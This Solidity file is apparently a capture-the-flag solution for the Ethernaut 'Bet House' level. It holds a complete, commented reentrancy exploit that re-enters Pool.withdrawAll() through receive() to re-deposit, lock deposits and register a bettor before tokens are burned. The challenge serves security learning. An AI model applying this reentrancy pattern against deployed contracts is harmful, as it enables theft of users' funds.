// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title BetHouseAttack
 * @notice Solution contract for Ethernaut Level 34: Bet House
 * 
 * VULNERABILITY: Cross-function reentrancy in Pool.withdrawAll()
 * 
 * The withdrawAll() function burns wrapped tokens AFTER sending ETH via .call().
 * This allows an attacker to re-enter during the ETH callback and:
 * 1. Re-deposit PDT to get more wrapped tokens
 * 2. Lock deposits
 * 3. Call makeBet() while still having sufficient token balance
 * 
 * After the callback returns, the tokens are burned, but we're already registered as a bettor!
 */

interface IPool {
    function deposit(uint256 value_) external payable;
    function withdrawAll() external;
    function lockDeposits() external;
    function balanceOf(address account_) external view returns (uint256);
    function depositsLocked(address account_) external view returns (bool);
    function depositToken() external view returns (address);
    function wrappedToken() external view returns (address);
}

interface IBetHouse {
    function makeBet(address bettor_) external;
    function isBettor(address bettor_) external view returns (bool);
    function pool() external view returns (address);
}

contract BetHouseAttack {
    IBetHouse public immutable betHouse;
    IPool public immutable pool;
    IERC20 public immutable depositToken;
    IERC20 public immutable wrappedToken;
    address public immutable attacker;
    
    bool private attacking;
    address private targetBettor;  // The address to register as bettor
    
    event AttackStarted(address attacker, address targetBettor, uint256 initialPDT);
    event ReentrancyTriggered(uint256 wrappedBalance, uint256 pdtBalance);
    event BetMade(address bettor, bool success);
    event AttackCompleted(address bettor, bool isBettor);
    
    constructor(address betHouse_) {
        betHouse = IBetHouse(betHouse_);
        pool = IPool(betHouse.pool());
        depositToken = IERC20(pool.depositToken());
        wrappedToken = IERC20(pool.wrappedToken());
        attacker = msg.sender;
    }
    
    /**
     * @notice Execute the attack to make a specific address a bettor
     * @param bettor_ The address to register as bettor (can be your EOA!)
     * @dev Must be called with 0.001 ETH and after transferring 5 PDT to this contract
     */
    function attack(address bettor_) external payable {
        require(msg.sender == attacker, "Only attacker");
        require(msg.value == 0.001 ether, "Need 0.001 ETH");
        
        uint256 pdtBalance = depositToken.balanceOf(address(this));
        require(pdtBalance >= 5, "Need at least 5 PDT");
        
        // Store the target bettor for use in receive()
        targetBettor = bettor_;
        
        emit AttackStarted(attacker, bettor_, pdtBalance);
        
        // Step 1: Approve PDT for Pool (approve max to handle re-deposit in callback)
        depositToken.approve(address(pool), type(uint256).max);
        
        // Step 2: Deposit PDT + ETH to get wrapped tokens
        // 5 PDT = 5 wrapped tokens, 0.001 ETH = 10 wrapped tokens = 15 total
        pool.deposit{value: 0.001 ether}(pdtBalance);
        
        // Step 3: Set attacking flag and call withdrawAll
        // This will trigger receive() during the ETH transfer
        attacking = true;
        pool.withdrawAll();
        attacking = false;
        
        // Verify success
        bool success = betHouse.isBettor(bettor_);
        emit AttackCompleted(bettor_, success);
        
        // Return any remaining ETH to attacker
        if (address(this).balance > 0) {
            payable(attacker).transfer(address(this).balance);
        }
        
        // Return any remaining PDT to attacker
        uint256 remainingPDT = depositToken.balanceOf(address(this));
        if (remainingPDT > 0) {
            depositToken.transfer(attacker, remainingPDT);
        }
    }
    
    /**
     * @notice Receive callback - this is where the reentrancy exploit happens
     * @dev Called when Pool sends ETH during withdrawAll()
     */
    receive() external payable {
        if (attacking) {
            uint256 wrappedBalance = pool.balanceOf(address(this));
            uint256 pdtBalance = depositToken.balanceOf(address(this));
            
            emit ReentrancyTriggered(wrappedBalance, pdtBalance);
            
            // At this point:
            // - We still have 15 wrapped tokens (not burned yet!)
            // - We just received 5 PDT back from the withdrawal
            // - We just received 0.001 ETH
            
            // Step 4: Re-deposit the PDT to get more wrapped tokens
            // 5 more PDT = 5 more wrapped tokens = 20 total!
            if (pdtBalance > 0) {
                pool.deposit(pdtBalance);
            }
            
            // Step 5: Lock our deposits
            pool.lockDeposits();
            
            // Step 6: Register the TARGET address as a bettor!
            // At this moment: balanceOf = 20, depositsLocked = true
            // The bettor_ parameter can be ANY address (like the player's EOA!)
            betHouse.makeBet(targetBettor);
            
            bool success = betHouse.isBettor(targetBettor);
            emit BetMade(targetBettor, success);
            
            // After this callback returns, withdrawAll() will burn our tokens
            // But the target is already registered as a bettor!
        }
    }
    
    /**
     * @notice Check if an address is a bettor
     */
    function isBettor(address addr) external view returns (bool) {
        return betHouse.isBettor(addr);
    }
}
